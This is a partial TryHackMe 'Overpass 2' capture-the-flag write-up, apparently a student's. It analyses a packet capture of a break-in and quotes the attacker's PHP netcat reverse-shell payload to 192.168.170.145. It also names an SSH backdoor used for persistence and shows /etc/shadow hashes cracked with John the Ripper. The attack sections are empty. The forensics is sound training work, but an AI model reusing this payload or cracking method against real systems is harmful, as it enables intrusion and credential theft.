# Overpass 2 - Hacked

- [Tools](#tools)
- [Forensics - Analyse the PCAP](#forensics---analyse-the-pcap)
- [Research - Analyse the code](#research---analyse-the-code)
- [Attack - Get back in!](#attack---get-back-in)

Room Link: https://tryhackme.com/room/overpass2hacked

## Tools 

1. 

##  Forensics - Analyse the PCAP

1. Download `overpass2.pcapng`.
2. Check and match `md5sum` of the file to verify file.
```bash
md5sum overpass2.pcapng 
11c3b2e9221865580295bc662c35c6dc  overpass2.pcapng
```
3. We can use `wireshark` and `follow TCP streams` of suspicious streams. But, I used `strings overpass2.pcapng`.
4. With strings we can see everything in plaintext. There is a request to link on directory `/development/upload.php`.
5. Question `What was the URL of the page they used to upload a reverse shell?` Answer `/development/`.
6. With same method we can get the payload `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`. You can check it by scrolling or simply use `strings overpass2.pcapng |grep "php exec"`
7. Question `What payload did the attacker use to gain access?` Answer `exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`.
8. Question `What password did the attacker use to privesc?` Answer `whene************tant`. You can manually scan strings result to see the password.
9. Question `How did the attacker establish persistence?` Answer `https://github.com/NinjaJc01/ssh-backdoor`. With same manual scrolling will work here.
10. We can see `cat /etc/shadow` command and it's result inside `strings` output. We can simply save it in a file named shadow.
11. Then we need to download `fasttrack` wordlist as instructed using command `wget https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt`.
12. Then we can run john to check.
```bash
john --wordlist=fasttrack.txt shadow 
Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
se*****y3        (paradox)
ab***23          (szymex)
s****t12         (bee)
1***2wsx         (muirland)
4g 0:00:00:04 100% 0.8113g/s 45.03p/s 187.4c/s 187.4C/s 2003..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
13. Question `Using the fasttrack wordlist, how many of the system passwords were crackable?` Answer `4` 


## Research - Analyse the code

## Attack - Get back in!


Author: Zishan Ahamed Thandar
